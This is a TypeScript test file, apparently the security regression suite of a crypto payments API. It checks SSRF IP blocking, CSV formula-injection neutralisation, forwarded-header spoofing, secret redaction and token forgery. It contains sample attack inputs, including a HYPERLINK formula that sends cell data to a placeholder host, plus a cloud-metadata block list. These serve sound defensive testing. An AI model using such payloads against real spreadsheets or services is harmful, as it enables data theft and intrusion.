import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { isBlockedIp } from "../url-safety";
import { formatCell, toCsvRow } from "../csv";
import { resolveTax } from "../tax-rates";
import { baseUnitsPerCent } from "../amounts";
import { parseApiKeyPrefix } from "../api-auth";
import { redactAuditDetails } from "../audit";
import { getClientIp } from "../client-ip";
import { verifyRefund } from "../verify-refund";

describe("url-safety: SSRF ranges (API-11)", () => {
  it("blocks the cloud metadata endpoint and RFC1918 space", () => {
    for (const ip of [
      "169.254.169.254",
      "127.0.0.1",
      "10.1.2.3",
      "172.16.0.1",
      "172.31.255.255",
      "192.168.1.1",
      "0.0.0.0",
    ]) {
      expect(isBlockedIp(ip), ip).toBe(true);
    }
  });

  it("blocks the ranges the old regex list was missing", () => {
    expect(isBlockedIp("100.64.0.1")).toBe(true); // CGNAT
    expect(isBlockedIp("192.0.0.1")).toBe(true); // IETF assignments
    expect(isBlockedIp("198.18.0.1")).toBe(true); // benchmarking
    expect(isBlockedIp("224.0.0.1")).toBe(true); // multicast
    expect(isBlockedIp("255.255.255.255")).toBe(true); // broadcast
  });

  it("blocks IPv4-mapped IPv6 forms of the metadata address", () => {
    expect(isBlockedIp("::ffff:169.254.169.254", 6)).toBe(true);
    expect(isBlockedIp("::ffff:127.0.0.1", 6)).toBe(true);
    expect(isBlockedIp("::1", 6)).toBe(true);
    expect(isBlockedIp("fe80::1", 6)).toBe(true);
    expect(isBlockedIp("fd00::1", 6)).toBe(true);
  });

  it("allows ordinary public addresses", () => {
    expect(isBlockedIp("8.8.8.8")).toBe(false);
    expect(isBlockedIp("172.32.0.1")).toBe(false); // just outside 172.16/12
    expect(isBlockedIp("100.63.255.255")).toBe(false); // just outside CGNAT
    expect(isBlockedIp("2606:4700::1111", 6)).toBe(false);
  });

  it("denies anything unparseable", () => {
    expect(isBlockedIp("")).toBe(true);
    expect(isBlockedIp("not-an-ip")).toBe(true);
  });
});

describe("csv: formula injection (API-29)", () => {
  it("neutralizes formula-leading cells", () => {
    for (const payload of [
      '=HYPERLINK("http://x/?"&A1,"click")',
      "+1+1",
      "-2+3",
      "@SUM(A1)",
    ]) {
      const out = formatCell(payload);
      expect(out.startsWith("\"'"), payload).toBe(true);
    }
  });

  it("still escapes embedded quotes when neutralizing", () => {
    expect(formatCell('=CMD("a")')).toBe('"\'=CMD(""a"")"');
  });

  it("leaves ordinary values and real numbers alone", () => {
    expect(formatCell("alice@example.com")).toBe("alice@example.com");
    expect(formatCell(-5)).toBe("-5");
    expect(toCsvRow(["a", "b,c"])).toBe('a,"b,c"');
  });
});

describe("tax-rates: int32 truncation (API-14)", () => {
  it("does not wrap subtotals above 2^31 cents", () => {
    const big = 3_000_000_000; // > Int32 max — `| 0` made this negative → null
    const result = resolveTax({ country: "DE", subtotalCents: big });
    expect(result).not.toBeNull();
    expect(result!.taxCents).toBe(570_000_000);
    expect(result!.totalCents).toBe(big + 570_000_000);
  });

  it("rejects non-finite input", () => {
    expect(resolveTax({ country: "DE", subtotalCents: Number.NaN })).toBeNull();
    expect(resolveTax({ country: "DE", subtotalCents: Infinity })).toBeNull();
  });

  it("truncates rather than bit-masking fractional cents", () => {
    expect(resolveTax({ country: "DE", subtotalCents: 100.9 })!.subtotalCents).toBe(100);
  });
});

describe("amounts: baseUnitsPerCent (API-13)", () => {
  it("matches the old hardcoded constant for 6-decimal tokens", () => {
    expect(baseUnitsPerCent(6)).toBe(10_000n);
  });

  it("scales for 18-decimal tokens instead of being 10^12 off", () => {
    expect(baseUnitsPerCent(18)).toBe(10n ** 16n);
  });

  it("refuses tokens that cannot represent a cent", () => {
    expect(() => baseUnitsPerCent(1)).toThrow();
    expect(() => baseUnitsPerCent(-1)).toThrow();
  });
});

describe("api-auth: key prefix capabilities", () => {
  it("derives type and mode from the prefix", () => {
    expect(parseApiKeyPrefix("sk_live_abcdefghij1234567890")).toEqual({
      keyType: "secret",
      livemode: true,
    });
    expect(parseApiKeyPrefix("pk_test_abcdefghij1234567890")).toEqual({
      keyType: "publishable",
      livemode: false,
    });
  });

  it("fails closed on an unrecognised prefix", () => {
    expect(parseApiKeyPrefix("xx_live_abcdefghij1234567890")).toBeNull();
    expect(parseApiKeyPrefix("sk_prod_abcdefghij1234567890")).toBeNull();
    expect(parseApiKeyPrefix("sk_live_short")).toBeNull();
    expect(parseApiKeyPrefix("")).toBeNull();
  });
});

describe("audit: secrets never reach the log", () => {
  it("redacts by key name at any depth", () => {
    const out = redactAuditDetails({
      name: "prod key",
      keyHash: "deadbeef",
      previousKeyHash: "cafebabe",
      nested: { webhookSecret: "whsec_x", url: "https://ok.example" },
    });
    expect(out.name).toBe("prod key");
    expect(out.keyHash).toBe("[redacted]");
    expect(out.previousKeyHash).toBe("[redacted]");
    expect((out.nested as Record<string, unknown>).webhookSecret).toBe("[redacted]");
    expect((out.nested as Record<string, unknown>).url).toBe("https://ok.example");
  });
});

describe("client-ip: x-forwarded-for spoofing (API-34)", () => {
  const original = process.env.TRUSTED_PROXY_HOPS;
  beforeEach(() => {
    delete process.env.TRUSTED_PROXY_HOPS;
  });
  afterEach(() => {
    if (original === undefined) delete process.env.TRUSTED_PROXY_HOPS;
    else process.env.TRUSTED_PROXY_HOPS = original;
  });

  function req(headers: Record<string, string>) {
    return new Request("http://test/", { headers });
  }

  it("ignores the attacker-controlled leftmost entry", () => {
    const ip = getClientIp(
      req({ "x-forwarded-for": "1.1.1.1, 203.0.113.9, 9.9.9.9" }),
    );
    expect(ip).toBe("9.9.9.9");
    expect(ip).not.toBe("1.1.1.1");
  });

  it("honours TRUSTED_PROXY_HOPS", () => {
    process.env.TRUSTED_PROXY_HOPS = "2";
    expect(
      getClientIp(req({ "x-forwarded-for": "1.1.1.1, 203.0.113.9, 9.9.9.9" })),
    ).toBe("203.0.113.9");
  });

  it("trusts nothing when TRUSTED_PROXY_HOPS=0", () => {
    // No proxy in front → the whole chain, and every edge header, is
    // client-supplied and equally forgeable.
    process.env.TRUSTED_PROXY_HOPS = "0";
    expect(getClientIp(req({ "x-forwarded-for": "1.2.3.4" }))).toBe("unknown");
    expect(
      getClientIp(req({ "x-forwarded-for": "1.1.1.1, 9.9.9.9" })),
    ).toBe("unknown");
    expect(getClientIp(req({ "cf-connecting-ip": "1.2.3.4" }))).toBe("unknown");
    expect(getClientIp(req({ "x-real-ip": "1.2.3.4" }))).toBe("unknown");
    expect(getClientIp(req({ "true-client-ip": "1.2.3.4" }))).toBe("unknown");
  });

  it("normalizes ports and IPv4-mapped forms", () => {
    expect(getClientIp(req({ "x-forwarded-for": "9.9.9.9:1234" }))).toBe("9.9.9.9");
    expect(getClientIp(req({ "x-forwarded-for": "::ffff:9.9.9.9" }))).toBe("9.9.9.9");
    expect(getClientIp(req({ "x-forwarded-for": "[2606:4700::1111]:443" }))).toBe(
      "2606:4700::1111",
    );
  });

  it("rejects values that are not IP literals", () => {
    expect(getClientIp(req({ "x-forwarded-for": "not-an-ip" }))).toBe("unknown");
    expect(getClientIp(req({ "x-forwarded-for": "999.1.1.1" }))).toBe("unknown");
    expect(getClientIp(req({ "x-forwarded-for": "x".repeat(2048) }))).toBe("unknown");
    expect(getClientIp(req({ "x-real-ip": "<script>" }))).toBe("unknown");
  });

  it("junk padding cannot displace the trusted rightmost entry", () => {
    expect(
      getClientIp(req({ "x-forwarded-for": "junk, junk, junk, 9.9.9.9" })),
    ).toBe("9.9.9.9");
  });

  it("falls back to edge headers, then unknown", () => {
    expect(getClientIp(req({ "cf-connecting-ip": "9.9.9.9" }))).toBe("9.9.9.9");
    expect(getClientIp(req({}))).toBe("unknown");
  });
});

describe("verify-refund: input hardening (API-03)", () => {
  const payment = {
    fromAddress: "0xBuyer",
    toAddress: "0xMerchant",
    refundedCents: 0,
    amountCents: 1000,
  };

  it("rejects non-integer cent amounts instead of throwing on BigInt()", () => {
    const r = verifyRefund({
      transferLogs: [],
      payment,
      usdcAddress: "0xToken",
      refundCents: 10.5,
      baseUnitsPerCent: 10_000n,
    });
    expect(r).toEqual({ ok: false, reason: "invalid_amount" });
  });

  it("rejects a zero scale", () => {
    const r = verifyRefund({
      transferLogs: [],
      payment,
      usdcAddress: "0xToken",
      refundCents: 100,
      baseUnitsPerCent: 0n,
    });
    expect(r).toEqual({ ok: false, reason: "invalid_amount" });
  });

  it("accepts a matching transfer", () => {
    const r = verifyRefund({
      transferLogs: [
        {
          token: "0xtoken",
          from: "0xmerchant",
          to: "0xbuyer",
          value: 1_000_000n,
        },
      ],
      payment,
      usdcAddress: "0xToken",
      refundCents: 100,
      baseUnitsPerCent: 10_000n,
    });
    expect(r).toEqual({ ok: true });
  });
});

describe("portal-tokens: no hardcoded fallback secret (API-02)", () => {
  const original = process.env.BETTER_AUTH_SECRET;
  afterEach(() => {
    if (original === undefined) delete process.env.BETTER_AUTH_SECRET;
    else process.env.BETTER_AUTH_SECRET = original;
    vi.restoreAllMocks();
  });

  it("refuses to sign and denies verification without a secret", async () => {
    process.env.BETTER_AUTH_SECRET = "x".repeat(32);
    const { signPortalToken, verifyPortalToken } = await import("../portal-tokens");
    const id = "11111111-1111-4111-8111-111111111111";
    const token = signPortalToken(id);
    expect(verifyPortalToken(token, id)).toBe(true);
    expect(verifyPortalToken(token, "22222222-2222-4222-8222-222222222222")).toBe(false);

    vi.spyOn(console, "error").mockImplementation(() => {});
    delete process.env.BETTER_AUTH_SECRET;
    expect(() => signPortalToken(id)).toThrow(/BETTER_AUTH_SECRET/);
    expect(verifyPortalToken(token, id)).toBe(false);
  });

  it("rejects a short secret rather than accepting a weak key", async () => {
    process.env.BETTER_AUTH_SECRET = "short";
    const { signPortalToken } = await import("../portal-tokens");
    expect(() => signPortalToken("11111111-1111-4111-8111-111111111111")).toThrow(
      /at least 32/,
    );
  });

  it("denies a tampered signature", async () => {
    process.env.BETTER_AUTH_SECRET = "y".repeat(32);
    const { signPortalToken, verifyPortalToken } = await import("../portal-tokens");
    const id = "11111111-1111-4111-8111-111111111111";
    const decoded = Buffer.from(signPortalToken(id), "base64url").toString("utf8");
    const [cid, exp] = decoded.split(".");
    const forged = Buffer.from(`${cid}.${exp}.${"0".repeat(64)}`).toString("base64url");
    expect(verifyPortalToken(forged, id)).toBe(false);
  });
});
